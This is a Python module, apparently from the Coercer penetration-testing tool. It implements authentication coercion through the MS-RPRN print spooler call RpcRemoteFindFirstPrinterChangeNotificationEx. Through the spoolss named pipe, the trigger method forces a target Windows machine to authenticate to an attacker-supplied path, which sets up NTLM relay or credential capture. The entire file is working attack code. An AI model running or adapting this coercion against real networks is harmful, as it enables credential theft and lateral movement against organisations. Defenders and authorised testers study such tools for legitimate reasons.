#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : RpcRemoteFindFirstPrinterChangeNotificationEx.py
# Author             : Podalirius (@podalirius_)
# Date created       : 15 Sep 2022

from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
from coercer.network.DCERPCSessionError import DCERPCSessionError
from impacket.dcerpc.v5 import rprn
from impacket.dcerpc.v5.dtypes import NULL


class RpcRemoteFindFirstPrinterChangeNotificationEx(MSPROTOCOLRPCCALL):
    """
    Coercing a machine to authenticate using function RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65) of [MS-RPRN]: Print System Remote Protocol (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)

    Method found by:
     -
    """

    access = {
        "ncan_np": [
            {
                "namedpipe": r"\PIPE\spoolss",
                "uuid": "12345678-1234-abcd-ef00-0123456789ab",
                "version": "1.0"
            }
        ]
    }

    protocol = {
        "longname": "[MS-RPRN]: Print System Remote Protocol",
        "shortname": "MS-RPRN"
    }

    function = {
        "name": "RpcRemoteFindFirstPrinterChangeNotificationEx",
        "opnum": 65,
        "vulnerable_arguments": ["pszLocalMachine"]
    }

    def trigger(self, dcerpc_session, target):
        if dcerpc_session is not None:
            try:
                resp = rprn.hRpcOpenPrinter(dcerpc_session, '\\\\%s\x00' % target)
                request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
                request['hPrinter'] = resp['pHandle']
                request['fdwFlags'] = rprn.PRINTER_CHANGE_ADD_JOB
                request['pszLocalMachine'] = self.path
                request['pOptions'] = NULL
                resp = dcerpc_session.request(request)
                return ""
            except Exception as err:
                return err
        else:
            print("[!] Error: dce is None, you must call connect() first.")
            return None
